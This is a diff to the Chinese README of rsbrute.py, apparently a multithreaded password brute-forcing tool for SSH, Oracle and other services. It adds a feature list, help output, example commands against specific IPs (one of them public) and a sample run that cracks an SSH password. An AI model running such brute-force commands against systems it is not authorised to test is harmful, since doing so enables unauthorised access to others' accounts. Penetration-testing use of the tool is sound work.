@@ -4,7 +4,22 @@
 [![python](https://img.shields.io/static/v1?label=python&message=3.7&color=346fb0)](https://www.python.org/)
 [![Oracle Instant Client](https://img.shields.io/static/v1?label=Oracle%20Instant%20Client&message=11.2&color=e35949)](https://www.oracle.com/database/technologies/instant-client/downloads.html)
 
-### 安装
+### 功能
+
+* 解析给定参数
+
+* 生成字典列表
+
+  * 指明字典则加载给定的字典，否则加载默认字典
+
+  * 生成的字典形如 [(ip,port,user,pwd), (ip,port,user,pwd)]
+
+* 加载爆破服务的对应模块
+
+* 多线程爆破
+
+### 安装必要模块
+
 * pip install -r requirements.txt
 
 * 设置 oracle(爆破 oracle 的话需要进行下面的设置)
@@ -45,6 +60,7 @@
 ### 使用
 
 ```
+➜  python3 rsbrute.py -h
 usage: rsbrute.py [-h] [-i HOST] [-iL HOST_FILE] [-l USER] [-p PWD]
                   [-C USER_PWD_FILE] [-L USER_FILE] [-P PWD_FILE]
                   [--port PORT] -s
@@ -70,6 +86,19 @@ Examples:
   python3 rsbrute.py -s ssh -i 59.108.35.123
   python3 rsbrute.py -s ssh -i 192.168.3.123 -l root -p 123456
   python3 rsbrute.py -s ssh -i 192.168.3.123 -l root -P pwd_dict.txt
+```
+
+### 使用
+```
+➜  python3 rsbrute.py -s ssh -i 10.11.11.11 -l reber -P ~/pwd.txt -t 1
+[22:26:49] Start brute ssh ... 
+[22:26:51] [-] 10.11.11.11 22 reber admin 
+[22:26:52] [-] 10.11.11.11 22 reber root 
+[22:26:52] [*] 10.11.11.11 22 reber 123456 
+[22:27:04] [-] 10.11.11.11 22 reber test 
+[22:27:16] [-] 10.11.11.11 22 reber ftp 
+[22:27:18] [-] 10.11.11.11 22 reber mysql 
+[('10.11.11.11', 22, 'reber', '123456')]
 ```
 
 ### 引用
